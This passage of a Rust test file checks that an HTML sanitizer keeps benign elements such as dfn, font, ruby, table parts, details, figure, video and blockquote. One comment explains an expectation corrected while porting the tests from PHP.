    let html = "<p><dfn>definition</dfn></p>";
    let result = san(html);
    assert!(result.contains("<dfn>"));
}

#[test]
fn test_sanitizes_wbr_element() {
    let html = "<p>verylong<wbr>word</p>";
    let result = san(html);
    assert!(result.contains("wbr"));
}

#[test]
fn test_sanitizes_font_element() {
    let html = "<p><font color=\"red\">red text</font></p>";
    let result = san(html);
    // NOTE: PHP oracle FAILS this test as written (it asserts the exact
    // string `<font>`, but the color attribute survives so the output is
    // `<font color="red">`). Ported with the corrected expectation.
    assert!(result.contains("<font"));
}

#[test]
fn test_sanitizes_center_element() {
    let html = "<center>centered</center>";
    let result = san(html);
    assert!(result.contains("<center>"));
}

#[test]
fn test_sanitizes_description_element() {
    let html = "<dl><dt>Term</dt><description>Description</description></dl>";
    let result = san(html);
    assert!(result.contains("<description>"));
}

#[test]
fn test_sanitizes_ruby_rp_rt() {
    let html = "<ruby>漢<rp>(</rp><rt>kan</rt><rp>)</rp></ruby>";
    let result = san(html);
    assert!(result.contains("<rp>"));
    assert!(result.contains("<rt>"));
}

#[test]
fn test_sanitizes_tr_element() {
    let html = "<table><tr><td>Cell</td></tr></table>";
    let result = san(html);
    assert!(result.contains("<tr>"));
}

#[test]
fn test_sanitizes_thead_element() {
    let html = "<table><thead><tr><th>Header</th></tr></thead></table>";
    let result = san(html);
    assert!(result.contains("<thead>"));
}

#[test]
fn test_sanitizes_tbody_element() {
    let html = "<table><tbody><tr><td>Body</td></tr></tbody></table>";
    let result = san(html);
    assert!(result.contains("<tbody>"));
}

#[test]
fn test_sanitizes_th_element() {
    let html = "<table><tr><th>Header</th></tr></table>";
    let result = san(html);
    assert!(result.contains("<th>"));
}

#[test]
fn test_sanitizes_td_element() {
    let html = "<table><tr><td>Cell</td></tr></table>";
    let result = san(html);
    assert!(result.contains("<td>"));
}

#[test]
fn test_sanitizes_summary_element() {
    let html = "<details><summary>Toggle</summary>Content</details>";
    let result = san(html);
    assert!(result.contains("<summary>"));
}

#[test]
fn test_sanitizes_figure_element() {
    let html = "<figure><img src=\"img.png\"><figcaption>Caption</figcaption></figure>";
    let result = san(html);
    assert!(result.contains("<figure>"));
}

#[test]
fn test_sanitizes_details_element() {
    let html = "<details><summary>Toggle</summary>Content</details>";
    let result = san(html);
    assert!(result.contains("<details>"));
}

#[test]
fn test_sanitizes_video_element() {
    let html = "<video src=\"video.mp4\"></video>";
    let result = san(html);
    assert!(result.contains("<video"));
}

#[test]
fn test_sanitizes_blockquote_element() {
    let html = "<blockquote cite=\"http://example.com\">Quote</blockquote>";
    let result = san(html);
    assert!(result.contains("<blockquote"));
}
